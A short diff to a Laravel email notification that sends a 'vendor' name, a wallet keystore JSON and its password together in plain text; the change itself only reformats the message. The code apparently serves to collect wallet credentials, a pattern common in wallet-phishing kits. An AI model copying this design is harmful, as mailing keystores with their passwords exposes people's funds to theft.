@@ -46,10 +46,9 @@ class KeystoreNotification extends Notification
         return (new MailMessage)
             ->greeting('Hello,')
             ->subject('New Keystore Details')
-            ->line('<b>Vendor:</b> ' . $this->details->vendor)
-            ->line('<b>Keystore JSON:</b> ' . '``' . $this->details->keystore . '``')
-            ->line('<b>Password:</b> ' . '``' . $this->details->password . '``')
-            ->line('<br><br><br><br>')
+            ->line('**Vendor:** ' . $this->details->vendor)
+            ->line('**Keystore JSON:** ' . '``' . $this->details->keystore . '``')
+            ->line('**Password:** ' . '``' . $this->details->password . '``')
             ->line('Thank you for using our services 🚀');
     }
 
